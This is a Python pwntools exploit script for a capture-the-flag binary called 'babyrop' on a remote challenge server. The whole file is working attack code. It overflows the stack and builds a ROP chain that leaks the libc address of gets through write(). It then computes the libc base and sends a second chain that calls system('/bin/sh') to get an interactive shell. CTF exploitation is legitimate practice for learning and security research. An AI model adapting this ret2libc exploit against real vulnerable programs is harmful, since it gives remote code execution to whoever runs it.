from pwn import *

elf = context.binary = ELF("./babyrop")
rop = ROP(elf)
# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("./libc6_2.31-0ubuntu9.2_amd64.so")

p = process(elf.path)
# p = gdb.debug(elf.path, '''
# b *main+53
# c
# ''')
p = remote("dicec.tf", 31924)

OFFSET = b"A" * 72

print("[+] OFFSET:", len(OFFSET))

stdout = p64(1)
addr_len = p64(8)
GETS_GOT = elf.got['gets']
WRITE_GOT = elf.plt['write']
MAIN_FUNC = elf.symbols['main']
print("[+] GETS_GOT: " + hex(GETS_GOT))
print("[+] WRITE_GOT: " + hex(WRITE_GOT))

POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
POP_RSI = (rop.find_gadget(['pop rsi', 'pop r15', 'ret']))[0]
RET = (rop.find_gadget(['ret']))[0]
print("[+] POP_RDI: " + hex(POP_RDI))
print("[+] POP_RSI: " + hex(POP_RSI))  # pop rsi, r15

print(p.recv())  # "your name"

p.sendline(
    OFFSET
    + p64(0x4011d0)  # pop r14 ; pop r15 ; ret
    + p64(0x8)
    + p64(0x403E00)  # r15 - frame dummy

    + p64(0x40111d)  # pop rbp ; ret
    + p64(1)

    + p64(0x4011A7)  # some shit with rdx
    + p64(0x32323232)  # trash for rsp8
    + p64(0x40404040)  # trash for rbx
    + p64(0x41414141)  # trash for rbp
    + p64(0x42424242)  # trash for r12
    + p64(0x43434343)  # trash for r13
    + p64(0x44444444)  # trash for r14
    + p64(0x45454545)  # trash for r15

    + p64(POP_RDI)
    + stdout  # fd for write()

    + p64(POP_RSI)
    + p64(GETS_GOT)  # to print
    + p64(0x41414141)  # trash for r15

    + p64(WRITE_GOT)

    + p64(MAIN_FUNC)
)

print("[*] listening for leaked gets address")
gets_leaked = u64(p.recv(8))
print("[+] gets() addr: " + hex(gets_leaked))

p.recv()
libc.address = gets_leaked - libc.symbols['gets']
print("[+] libc base: " + hex(libc.address))

BINSH = next(libc.search(b"/bin/sh"))
SYSTEM = libc.symbols["system"]
EXIT = libc.symbols["exit"]

print("[+] BINSH: ", hex(BINSH))
print("[+] SYSTEM: ", hex(SYSTEM))
print("[+] EXIT: ", hex(EXIT))

p.sendline(
    OFFSET
    + p64(RET)
    + p64(POP_RDI)
    + p64(BINSH)
    + p64(SYSTEM)
    + p64(EXIT)
)

p.interactive()
